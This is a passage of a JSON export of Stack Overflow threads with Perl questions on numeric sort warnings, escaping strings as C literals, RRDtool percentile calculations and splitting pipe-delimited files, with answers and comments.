a number?"}, {"owner": {"reputation": 57, "user_id": 6300056, "user_type": "registered", "accept_rate": 100, "profile_image": "https://lh4.googleusercontent.com/-lGVXaXvaOgA/AAAAAAAAAAI/AAAAAAAAADg/OTQRVZ1nlaQ/photo.jpg?sz=128", "display_name": "Viktor Predybaylo", "link": "https://stackoverflow.com/users/6300056/viktor-predybaylo"}, "edited": false, "score": 0, "creation_date": 1462884884, "post_id": 37071698, "comment_id": 61817091, "body": "out for print a: 65 83 47 10 83 46 45 30 43 6   b: 7  87  2 68 55 40 92 23 92 75 Argument &quot;7  87  2 68 55 40 92 23 92 75 \\n&quot; isn&#39;t numeric in numeric comparison (&lt;=&gt;)  Argument &quot;65 83 47 10 83 46 45 30 43 6 \\n&quot; isn&#39;t numeric in numeric comparison (&lt;=&gt;)   a: 7  87  2 68 55 40 92 23 92 75   b: 70 79 77 83 95 24 35 74 92 19 Argument &quot;70 79 77 83 95 24 35 74 92 19 \\n&quot; isn&#39;t numeric in numeric comparison (&lt;=&gt;)    a: 70 79 77 83 95 24 35 74 92 19   b: 65 83 47 10 83 46 45 30 43 6"}, {"owner": {"reputation": 57, "user_id": 6300056, "user_type": "registered", "accept_rate": 100, "profile_image": "https://lh4.googleusercontent.com/-lGVXaXvaOgA/AAAAAAAAAAI/AAAAAAAAADg/OTQRVZ1nlaQ/photo.jpg?sz=128", "display_name": "Viktor Predybaylo", "link": "https://stackoverflow.com/users/6300056/viktor-predybaylo"}, "edited": false, "score": 0, "creation_date": 1462964547, "post_id": 37071698, "comment_id": 61856821, "body": "need to remove white spaces tr/ //ds;, then sort"}, {"owner": {"reputation": 2298, "user_id": 1147230, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/fe33f45c5990a98cfcb1388581de07af?s=128&d=identicon&r=PG", "display_name": "Sebastian", "link": "https://stackoverflow.com/users/1147230/sebastian"}, "reply_to_user": {"reputation": 57, "user_id": 6300056, "user_type": "registered", "accept_rate": 100, "profile_image": "https://lh4.googleusercontent.com/-lGVXaXvaOgA/AAAAAAAAAAI/AAAAAAAAADg/OTQRVZ1nlaQ/photo.jpg?sz=128", "display_name": "Viktor Predybaylo", "link": "https://stackoverflow.com/users/6300056/viktor-predybaylo"}, "edited": false, "score": 0, "creation_date": 1462994500, "post_id": 37071698, "comment_id": 61877770, "body": "Ok if it&#39;s working for you, but looks to me like you need to <code>split &#47;\\s+&#47;</code> your values."}, {"owner": {"reputation": 57, "user_id": 6300056, "user_type": "registered", "accept_rate": 100, "profile_image": "https://lh4.googleusercontent.com/-lGVXaXvaOgA/AAAAAAAAAAI/AAAAAAAAADg/OTQRVZ1nlaQ/photo.jpg?sz=128", "display_name": "Viktor Predybaylo", "link": "https://stackoverflow.com/users/6300056/viktor-predybaylo"}, "edited": false, "score": 0, "creation_date": 1463047859, "post_id": 37071698, "comment_id": 61900619, "body": "Dear  Sebastian could you please advice how to do back operation from - tr/ //ds;? - I need to add white spaces for sorted string of digits."}, {"owner": {"reputation": 2298, "user_id": 1147230, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/fe33f45c5990a98cfcb1388581de07af?s=128&d=identicon&r=PG", "display_name": "Sebastian", "link": "https://stackoverflow.com/users/1147230/sebastian"}, "reply_to_user": {"reputation": 57, "user_id": 6300056, "user_type": "registered", "accept_rate": 100, "profile_image": "https://lh4.googleusercontent.com/-lGVXaXvaOgA/AAAAAAAAAAI/AAAAAAAAADg/OTQRVZ1nlaQ/photo.jpg?sz=128", "display_name": "Viktor Predybaylo", "link": "https://stackoverflow.com/users/6300056/viktor-predybaylo"}, "edited": false, "score": 0, "creation_date": 1463048147, "post_id": 37071698, "comment_id": 61900834, "body": "Sorry, I don&#39;t understand what you want. Maybe ask it as a new question including samples before/after?"}], "tags": [], "owner": {"reputation": 2298, "user_id": 1147230, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/fe33f45c5990a98cfcb1388581de07af?s=128&d=identicon&r=PG", "display_name": "Sebastian", "link": "https://stackoverflow.com/users/1147230/sebastian"}, "is_accepted": true, "score": 3, "last_activity_date": 1462535548, "creation_date": 1462535548, "answer_id": 37071698, "question_id": 37071500, "link": "https://stackoverflow.com/questions/37071500/warning-in-sort-function-argument-isnt-numeric-in-sort/37071698#37071698", "title": "warning in sort function &quot;argument isn&#39;t numeric in sort&quot;", "body": "<p><code>sort</code> is obviously complaining on your file content.</p>\n\n<p>You should try to debug the problem:</p>\n\n<pre><code>for my $line (@file_content) {\n    print \"line: \".$line;\n}\n</code></pre>\n\n<p>Check if there's anything except numbers (empty lines, lines with chars, etc.).</p>\n\n<p>If this doesn't help, try to get the warning in context:</p>\n\n<pre><code>@sorted = sort {\n    print \"a: $a\";\n    print \"b: $b\";\n    $a &lt;=&gt; $b;\n} @file_content;\n</code></pre>\n\n<p>This will likely generate a long output, but the <code>a: ...</code> and <code>b: ...</code> lines just above the warning show the line causing the problem.</p>\n\n<p>Do you really want a numeric sort? A text sort might be the solution:</p>\n\n<pre><code>@sorted = sort { $a cmp $b } @file_content;\n</code></pre>\n\n<p>Notice that your way of reading the file includes the final line break (usually <code>\\n</code>). This won't affect numeric sorting as Perl simply cuts off anything which is no number if the string begins with a number, but might confuse the remaining part of your script. Try <code>chomp</code> to get rid of them.</p>\n"}], "owner": {"reputation": 57, "user_id": 6300056, "user_type": "registered", "accept_rate": 100, "profile_image": "https://lh4.googleusercontent.com/-lGVXaXvaOgA/AAAAAAAAAAI/AAAAAAAAADg/OTQRVZ1nlaQ/photo.jpg?sz=128", "display_name": "Viktor Predybaylo", "link": "https://stackoverflow.com/users/6300056/viktor-predybaylo"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1260, "favorite_count": 0, "accepted_answer_id": 37071698, "answer_count": 1, "score": 2, "last_activity_date": 1482692091, "creation_date": 1462534941, "question_id": 37071500, "link": "https://stackoverflow.com/questions/37071500/warning-in-sort-function-argument-isnt-numeric-in-sort", "title": "warning in sort function &quot;argument isn&#39;t numeric in sort&quot;", "body": "<p>Following code produce warning - \"argument isn't numeric in sort \".</p>\n\n<p>what wrong with my code?\ncode:</p>\n\n<pre><code>my $input_file = 'text.txt';\nmy (@file_content, @sorted);\n\nopen(FD, \"&lt;\", \"$input_file\") or die \"Could not open file '$input_file' $!\";\n@file_content = &lt;FD&gt;;\nclose (FD);\n\n@sorted = sort { $a &lt;=&gt; $b } @file_content;\n</code></pre>\n\n<p>file text.txt contain two strings with digits.</p>\n"}, {"tags": ["c", "perl"], "comments": [{"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1462531934, "post_id": 37070155, "comment_id": 61686074, "body": "C will aceept that string unchanged. If you want something more then you must specify exactly what may appear in the string and how you want it displayed"}, {"owner": {"reputation": 17713, "user_id": 226648, "user_type": "registered", "accept_rate": 35, "profile_image": "https://www.gravatar.com/avatar/3196df423fd95dc4fce7dfadb8ec9953?s=128&d=identicon&r=PG", "display_name": "el.pescado", "link": "https://stackoverflow.com/users/226648/el-pescado"}, "reply_to_user": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1462532149, "post_id": 37070155, "comment_id": 61686182, "body": "I mean generate that string in Perl. I forgot to mention that in question body (although it was mentioned in title and tagged) - see my edit."}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1462532536, "post_id": 37070155, "comment_id": 61686404, "body": "What&#39;s wrong with <code>print qq{const char *str = &quot;Hello, world\\\\n&quot;;\\n};</code>?"}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1462532682, "post_id": 37070155, "comment_id": 61686489, "body": "That&#39;s saying that you don&#39;t appear to have a program that you can&#39;t get to work, and that you need help with. Your question is also overly vague and I doubt if you are going to get a useful answer until it is clear in your own mind what you really need"}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 1, "creation_date": 1462533053, "post_id": 37070155, "comment_id": 61686700, "body": "Okay, and what have you tried that doesn&#39;t work? Is your string always 7-bit ASCII? Will the stuff from <code>get_string</code> contain escapes like you originally said <code>\\110\\145\\154\\154\\157\\054\\040\\167\\157\\162\\154\\144\\012</code>? I&#39;m surprised at you writing a junk question like this with a reputation of 11K"}], "answers": [{"tags": [], "owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "is_accepted": false, "score": 1, "last_activity_date": 1462553991, "last_edit_date": 1462553991, "creation_date": 1462531830, "answer_id": 37070515, "question_id": 37070155, "link": "https://stackoverflow.com/questions/37070155/perl-convert-string-to-a-c-string-literal/37070515#37070515", "title": "Perl: convert string to a C string literal", "body": "<p>That will work fine as it is</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n\nint main(int argc, char *argv[]) {\n    printf(\"\\110\\145\\154\\154\\157\\054\\040\\167\\157\\162\\154\\144\\012\");\n}\n</code></pre>\n\n<h3>output</h3>\n\n<pre class=\"lang-none prettyprint-override\"><code>Hello, world\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 2298, "user_id": 1147230, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/fe33f45c5990a98cfcb1388581de07af?s=128&d=identicon&r=PG", "display_name": "Sebastian", "link": "https://stackoverflow.com/users/1147230/sebastian"}, "is_accepted": false, "score": 3, "last_activity_date": 1462533064, "creation_date": 1462533064, "answer_id": 37070911, "question_id": 37070155, "link": "https://stackoverflow.com/questions/37070155/perl-convert-string-to-a-c-string-literal/37070911#37070911", "title": "Perl: convert string to a C string literal", "body": "<pre><code>#!/usr/bin/perl\n\nuse strict;\nuse warnings;\n\nmy $str = q/Hello, \"C\" string/ . \"\\n\";\n$str =~ s/(\\W)/sprintf('\\\\%03o',ord($1))/ge;\nprint \"const char *str = \\\"$str\\\";\"\n</code></pre>\n\n<p>The RegEx matches every char except <code>a-z A-Z 0-9 _</code> and converts it to a octal value. You could easily replace <code>(\\W)</code> by any more specific match like <code>([^a-zA-Z0-9,\\.\\-])</code> (match everything except <code>a-z A-Z 0-9 , . -</code>) or <code>([\\x00-\\x1f])</code> (match every ASCII code less than 30 = space).</p>\n\n<p>A shorter solution would be:</p>\n\n<pre><code>$str =~ s/([\"'`])/\\\\$1/g;\n</code></pre>\n\n<p>But that one would only escape quotation marks with a <code>\\</code> prefix. All other chars which might cause trouble get through without replacement.</p>\n"}, {"comments": [{"owner": {"reputation": 59603, "user_id": 60281, "user_type": "registered", "accept_rate": 98, "profile_image": "https://www.gravatar.com/avatar/29ebf39f3857b4fc4f51e93e7b9c4af4?s=128&d=identicon&r=PG", "display_name": "DevSolar", "link": "https://stackoverflow.com/users/60281/devsolar"}, "edited": false, "score": 1, "creation_date": 1462533562, "post_id": 37070987, "comment_id": 61687002, "body": "Can&#39;t beat ready-made library solutions. ;-)"}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1462535131, "post_id": 37070987, "comment_id": 61687954, "body": "I wouldn&#39;t be too happy to see this used in production code. It adds a huge chunk of code for the sake of one utility function. The module&#39;s description has this <i>&quot;The B module supplies classes which allow a Perl program to delve into its own innards. It is the module used to implement the &quot;backends&quot; of the Perl compiler. Usage of the compiler does not require knowledge of this module: see the O module for the user-visible part. The B module is of use to those who want to write new compiler backends.&quot;</i>"}, {"owner": {"reputation": 17713, "user_id": 226648, "user_type": "registered", "accept_rate": 35, "profile_image": "https://www.gravatar.com/avatar/3196df423fd95dc4fce7dfadb8ec9953?s=128&d=identicon&r=PG", "display_name": "el.pescado", "link": "https://stackoverflow.com/users/226648/el-pescado"}, "edited": false, "score": 1, "creation_date": 1462538708, "post_id": 37070987, "comment_id": 61690137, "body": "I&#39;d agree were it external module. But <code>B</code> is a core module implemented as XS. My simple benchmarks show that performance impact is negligible."}, {"owner": {"reputation": 17713, "user_id": 226648, "user_type": "registered", "accept_rate": 35, "profile_image": "https://www.gravatar.com/avatar/3196df423fd95dc4fce7dfadb8ec9953?s=128&d=identicon&r=PG", "display_name": "el.pescado", "link": "https://stackoverflow.com/users/226648/el-pescado"}, "edited": false, "score": 1, "creation_date": 1462538788, "post_id": 37070987, "comment_id": 61690193, "body": "nb. it provides also <code>perlstring</code> function which produces Perl string literal."}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1462544386, "post_id": 37070987, "comment_id": 61694067, "body": "Maybe, but would you be happy to use, say, <code>XML::Twig::XPath</code> if you found that it just happened to contain a <code>cstring</code>? This just isn&#39;t what the <code>B</code> module is meant for"}, {"owner": {"reputation": 17713, "user_id": 226648, "user_type": "registered", "accept_rate": 35, "profile_image": "https://www.gravatar.com/avatar/3196df423fd95dc4fce7dfadb8ec9953?s=128&d=identicon&r=PG", "display_name": "el.pescado", "link": "https://stackoverflow.com/users/226648/el-pescado"}, "edited": false, "score": 0, "creation_date": 1462549661, "post_id": 37070987, "comment_id": 61697643, "body": "if <code>XML::Twig::XPath</code> was already being used by my application, i&#39;d use it for <code>cstring</code>. And, IMO that&#39;s the case with <code>B</code> - all those <code>SV</code>s, <code>PV</code>s et al are already in Perl interpreter (that&#39;s what makes Perl work, after all), and <code>B</code> merely gives access to those objects rfom Perl itself."}], "tags": [], "owner": {"reputation": 17713, "user_id": 226648, "user_type": "registered", "accept_rate": 35, "profile_image": "https://www.gravatar.com/avatar/3196df423fd95dc4fce7dfadb8ec9953?s=128&d=identicon&r=PG", "display_name": "el.pescado", "link": "https://stackoverflow.com/users/226648/el-pescado"}, "is_accepted": false, "score": 3, "last_activity_date": 1462533286, "creation_date": 1462533286, "answer_id": 37070987, "question_id": 37070155, "link": "https://stackoverflow.com/questions/37070155/perl-convert-string-to-a-c-string-literal/37070987#37070987", "title": "Perl: convert string to a C string literal", "body": "<p>It seems that Perl provides <a href=\"http://perldoc.perl.org/B.html#Miscellaneous-Utility-Functions\" rel=\"nofollow\"><code>B::cstring</code></a> function for this exact purpose:</p>\n\n<blockquote>\n  <p><strong>cstring(STR)</strong></p>\n  \n  <p>Returns a double-quote-surrounded escaped version of STR which can be\n  used as a string in C source code.</p>\n</blockquote>\n\n<pre><code>print B::cstring(q/hi \"C\" string/)\n# prints \"hi \\\"C\\\" string\"\n</code></pre>\n"}], "owner": {"reputation": 17713, "user_id": 226648, "user_type": "registered", "accept_rate": 35, "profile_image": "https://www.gravatar.com/avatar/3196df423fd95dc4fce7dfadb8ec9953?s=128&d=identicon&r=PG", "display_name": "el.pescado", "link": "https://stackoverflow.com/users/226648/el-pescado"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 196, "favorite_count": 0, "closed_date": 1462535359, "answer_count": 3, "score": 0, "last_activity_date": 1462791150, "creation_date": 1462530720, "last_edit_date": 1462791150, "question_id": 37070155, "link": "https://stackoverflow.com/questions/37070155/perl-convert-string-to-a-c-string-literal", "closed_reason": "Not suitable for this site", "title": "Perl: convert string to a C string literal", "body": "<p>How can I use Perl to convert an arbitrary string to a valid, human readable\nC string literal (i.e. something that can be put into C source and understood by the C compiler)?</p>\n\n<p>Bonus points for solution requiring only core modules.</p>\n\n<pre><code>#!/usr/bin/perl\n\nuse strict;\nuse warnings;\n\nmy $str = get_some_string();    # Read string from file, database, network etc\nmy $cstr = ???($str);\nprint \"const char *str = $cstr;\" # This has to form valid C statement\n</code></pre>\n\n<p>Example output:</p>\n\n<pre><code>const char *str = \"Hello, \\\"C\\\" string\\n\";\n</code></pre>\n"}, {"tags": ["perl", "rrdtool", "percentile", "rrd"], "answers": [{"comments": [{"owner": {"reputation": 873, "user_id": 508427, "user_type": "registered", "accept_rate": 78, "profile_image": "https://i.stack.imgur.com/3zmlJ.jpg?s=128&g=1", "display_name": "Recct", "link": "https://stackoverflow.com/users/508427/recct"}, "edited": false, "score": 0, "creation_date": 1462792007, "post_id": 37104229, "comment_id": 61769560, "body": "Yeah just not to care which is in or out but use all the datapoints from both in and out, line them up and get the 95th off that, will see how this looks but I suspect it will disregard the lower and I&#39;ll be endinb up with 95th(in) or 95th(out) depending on which was max"}, {"owner": {"reputation": 873, "user_id": 508427, "user_type": "registered", "accept_rate": 78, "profile_image": "https://i.stack.imgur.com/3zmlJ.jpg?s=128&g=1", "display_name": "Recct", "link": "https://stackoverflow.com/users/508427/recct"}, "edited": false, "score": 0, "creation_date": 1462793098, "post_id": 37104229, "comment_id": 61770223, "body": "Gets me only the 9th of the bigger value, perhaps with some set operations I could combine the 2 data sources not sure how that might look like though"}, {"owner": {"reputation": 873, "user_id": 508427, "user_type": "registered", "accept_rate": 78, "profile_image": "https://i.stack.imgur.com/3zmlJ.jpg?s=128&g=1", "display_name": "Recct", "link": "https://stackoverflow.com/users/508427/recct"}, "edited": false, "score": 0, "creation_date": 1462793999, "post_id": 37104229, "comment_id": 61770788, "body": "Essentially, calculate 95th Percentile on <code>in</code> and <code>out</code> series rather than the results of their averaging/ converting to bits"}, {"owner": {"reputation": 4591, "user_id": 235990, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/4a6bad1085e07d7f29498019f1840f4b?s=128&d=identicon&r=PG", "display_name": "Tobi Oetiker", "link": "https://stackoverflow.com/users/235990/tobi-oetiker"}, "reply_to_user": {"reputation": 873, "user_id": 508427, "user_type": "registered", "accept_rate": 78, "profile_image": "https://i.stack.imgur.com/3zmlJ.jpg?s=128&g=1", "display_name": "Recct", "link": "https://stackoverflow.com/users/508427/recct"}, "edited": false, "score": 0, "creation_date": 1462794421, "post_id": 37104229, "comment_id": 61771062, "body": "hihi there are many things you can calculate ... it relay depends on what you want :) First define the problem ..."}, {"owner": {"reputation": 873, "user_id": 508427, "user_type": "registered", "accept_rate": 78, "profile_image": "https://i.stack.imgur.com/3zmlJ.jpg?s=128&g=1", "display_name": "Recct", "link": "https://stackoverflow.com/users/508427/recct"}, "edited": false, "score": 0, "creation_date": 1462810567, "post_id": 37104229, "comment_id": 61782222, "body": "Added a little programatic solution I did which I think some consider an accepted as &quot;in+out&quot; (although the <code>+</code> is misleading) standard of 95th percentile for bandwidth"}], "tags": [], "owner": {"reputation": 4591, "user_id": 235990, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/4a6bad1085e07d7f29498019f1840f4b?s=128&d=identicon&r=PG", "display_name": "Tobi Oetiker", "link": "https://stackoverflow.com/users/235990/tobi-oetiker"}, "is_accepted": false, "score": 1, "last_activity_date": 1462737608, "creation_date": 1462737608, "answer_id": 37104229, "question_id": 37068922, "link": "https://stackoverflow.com/questions/37068922/get-95th-percentile-only-through-rrd/37104229#37104229", "title": "Get 95th Percentile only through RRD", "body": "<p>I am not quite sure what you mean by 'flattened' but maybe you man to keep whichever is larger ?</p>\n\n<pre><code>\"DEF:in=$rrd_file:traffic_in:AVERAGE:step=1\",\n\"DEF:out=$rrd_file:traffic_out:AVERAGE:step=1\",\n'CDEF:bitin=in,8,*',\n'CDEF:bitout=out,8,*'\n'CDEF:bitmax=bitin,bitout,MAX',\n'VDEF:pct_max=total,95,PERCENT',\n'VDEF:pct_in=bitin,95,PERCENT',\n'VDEF:pct_out=bitout,95,PERCENT'\n</code></pre>\n"}], "owner": {"reputation": 873, "user_id": 508427, "user_type": "registered", "accept_rate": 78, "profile_image": "https://i.stack.imgur.com/3zmlJ.jpg?s=128&g=1", "display_name": "Recct", "link": "https://stackoverflow.com/users/508427/recct"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 505, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1462809999, "creation_date": 1462527120, "last_edit_date": 1462809999, "question_id": 37068922, "link": "https://stackoverflow.com/questions/37068922/get-95th-percentile-only-through-rrd", "title": "Get 95th Percentile only through RRD", "body": "<p>Yes I know, </p>\n\n<pre><code>\"DEF:in=$rrd_file:traffic_in:AVERAGE:step=1\",\n\"DEF:out=$rrd_file:traffic_out:AVERAGE:step=1\",\n'CDEF:bitin=in,8,*',\n'CDEF:bitout=out,8,*',\n'CDEF:total=bitin,bitout,+',\n'VDEF:pct_total=total,95,PERCENT',\n'VDEF:pct_in=bitin,95,PERCENT',\n'VDEF:pct_out=bitout,95,PERCENT',\n</code></pre>\n\n<p>To get In, Out and a 95th(In+Out). </p>\n\n<p>But 95th(In+Out) although correct for what it is, it's not what I need as a <em>total</em> 95th.</p>\n\n<p>I need it the conventional In values and Out values together \"flattened\" and 95th calculated off that. \nSo that if 1 link is doing mostly Inbound with big In spikes this better 95th percentile will be a number closer to the average Inbound traffic, because most/all the top spikes will be inbound traffic outbound doesnt factor in much in the total usage. \nAnd similarly link 2 does mostly Outbound this 95th percentile would be a number closer to the Outbound average traffic. </p>\n\n<p>Is there a way to do that with RRDtools alone at all, similar to the above command parameters? </p>\n\n<p>In perl I've done something (dirty) like that but I don't align the time window (<code>-a</code> is not recognised by <code>rrdtool fetch</code> as a parameter) and for longer periods of time (say a month) I get few samples, so some reconciliation is hidden from me;</p>\n\n<pre><code>my ($start, $end, $rrd_file) = @_;\n\nmy @series = `rrdtool fetch -s $start -e $end $rrd_file MAX`;\n\nmy @all;\nforeach my $line (@series) {\n    if ($line !~ m/nan/ig &amp;&amp; $line =~ m/(\\d+): (\\S+) (\\S+)/) {\n        my ($time, $in, $out) = ($1, $2, $3);\n\n        push(@all, $in * 8, $out * 8);\n    }\n}\n\n@all = sort {$b &lt;=&gt; $a} @all;\n\nmy $index_all = int(scalar(@all) * 0.05) + 1;\n\nreturn sprintf(\"%.2f\", $all[$index_all] / 1000 / 1000);\n</code></pre>\n\n<p>where </p>\n\n<pre><code>my $end = DateTime-&gt;now(time_zone =&gt; 'local')-&gt;truncate(to =&gt; 'minute');\nmy $start = $end-&gt;clone-&gt;subtract(hours =&gt; 168)-&gt;epoch();\n$end = $end-&gt;epoch();\n</code></pre>\n"}, {"tags": ["perl", "split", "delimiter"], "comments": [{"owner": {"reputation": 18548, "user_id": 4082052, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/GUNps.jpg?s=128&g=1", "display_name": "Sundeep", "link": "https://stackoverflow.com/users/4082052/sundeep"}, "edited": false, "score": 1, "creation_date": 1462518396, "post_id": 37066221, "comment_id": 61678206, "body": "can you post sample contents from input file and sample output you expect"}, {"owner": {"reputation": 1, "user_id": 6299016, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/7835d3a45c131f47509457620a7b1a62?s=128&d=identicon&r=PG&f=1", "display_name": "ninjagirl", "link": "https://stackoverflow.com/users/6299016/ninjagirl"}, "reply_to_user": {"reputation": 18548, "user_id": 4082052, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/GUNps.jpg?s=128&g=1", "display_name": "Sundeep", "link": "https://stackoverflow.com/users/4082052/sundeep"}, "edited": false, "score": 0, "creation_date": 1463032439, "post_id": 37066221, "comment_id": 61890632, "body": "Hi! Sorry for the late respond. Sample is london||||america|||japan|||760|||usa|| . I want to get the 760 and throw it to a new text file. Thank you very much!"}], "answers": [{"tags": [], "owner": {"reputation": 141, "user_id": 6294402, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/yIm7U.jpg?s=128&g=1", "display_name": "vishalk169", "link": "https://stackoverflow.com/users/6294402/vishalk169"}, "is_accepted": false, "score": -1, "last_activity_date": 1462520582, "last_edit_date": 1462520582, "creation_date": 1462519566, "answer_id": 37066680, "question_id": 37066221, "link": "https://stackoverflow.com/questions/37066221/i-have-a-file-that-i-want-to-split-using-pipe-as-delimiter-how-can-i-read-the-f/37066680#37066680", "title": "I have a file that I want to split using pipe as delimiter. How can I read the file using Perl?", "body": "<pre><code>#!/usr/bin/perl\n\nuse strict;\nuse warnings;\n\nuse Data::Dumper;\n\nopen(FILE, \"&lt;filename_$procDate.txt\") or die \"Couldn't open file filename_$procDate.txt, $!\";\n\nwhile ( my $line = &lt;FILE&gt; ) {\n    print \"Line content is $line\\n\";\n    my @line_content = split(/\\|/, $line);\n    print Dumper (\\@line_content);\n}\n\nclose (FILE);\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 1, "user_id": 6299016, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/7835d3a45c131f47509457620a7b1a62?s=128&d=identicon&r=PG&f=1", "display_name": "ninjagirl", "link": "https://stackoverflow.com/users/6299016/ninjagirl"}, "edited": false, "score": 0, "creation_date": 1463031754, "post_id": 37067328, "comment_id": 61890350, "body": "Hi sorry for the late respond. My text file has pipe characters in it and I want to get certain parts of it after split. For example . rachel|||||ann||||9760|||| . I want to get the 9760 and throw it into a new txt file. I appreciate your help and apologize as I am a beginner in perl. Thank you!"}, {"owner": {"reputation": 1, "user_id": 6299016, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/7835d3a45c131f47509457620a7b1a62?s=128&d=identicon&r=PG&f=1", "display_name": "ninjagirl", "link": "https://stackoverflow.com/users/6299016/ninjagirl"}, "edited": false, "score": 0, "creation_date": 1463032620, "post_id": 37067328, "comment_id": 61890713, "body": "I tried the your code Sir. But it seems to have errors. Like Can&#39;t use global $! in &quot;my&quot; at ./subsdump.pl line 10, near &quot;die $!&quot; Global symbol &quot;$fh&quot; requires explicit package name at ./subsdump.pl line 12. Execution of ./subsdump.pl aborted due to compilation errors."}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "reply_to_user": {"reputation": 1, "user_id": 6299016, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/7835d3a45c131f47509457620a7b1a62?s=128&d=identicon&r=PG&f=1", "display_name": "ninjagirl", "link": "https://stackoverflow.com/users/6299016/ninjagirl"}, "edited": false, "score": 0, "creation_date": 1463034770, "post_id": 37067328, "comment_id": 61891664, "body": "@ninjagirl: I&#39;m sorry, there was a semicolon missing. Please try again, and note that you must pass the value of <code>$procDate</code> as a parameter on the command line"}, {"owner": {"reputation": 1, "user_id": 6299016, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/7835d3a45c131f47509457620a7b1a62?s=128&d=identicon&r=PG&f=1", "display_name": "ninjagirl", "link": "https://stackoverflow.com/users/6299016/ninjagirl"}, "edited": false, "score": 0, "creation_date": 1463035464, "post_id": 37067328, "comment_id": 61892060, "body": "Oh my gosh! It printed the text file but without the pipe! Thank you.Now all i need is to get a specific field"}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "reply_to_user": {"reputation": 1, "user_id": 6299016, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/7835d3a45c131f47509457620a7b1a62?s=128&d=identicon&r=PG&f=1", "display_name": "ninjagirl", "link": "https://stackoverflow.com/users/6299016/ninjagirl"}, "edited": false, "score": 0, "creation_date": 1463035985, "post_id": 37067328, "comment_id": 61892352, "body": "@ninjagirl: That&#39;s just a list of all the elements in the <code>@fields</code> array. From your sample data in the comment above I think you want to <code>print $fields[10], &quot;\\n&quot;;</code>"}, {"owner": {"reputation": 1, "user_id": 6299016, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/7835d3a45c131f47509457620a7b1a62?s=128&d=identicon&r=PG&f=1", "display_name": "ninjagirl", "link": "https://stackoverflow.com/users/6299016/ninjagirl"}, "edited": false, "score": 0, "creation_date": 1463036336, "post_id": 37067328, "comment_id": 61892560, "body": "i got the following error. I am so sorry I am at lost with this. Use of uninitialized value $fields[176] in concatenation (.) or string at ./subsdump.pl line 15, &lt;$fh&gt; line 1.  ,"}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, 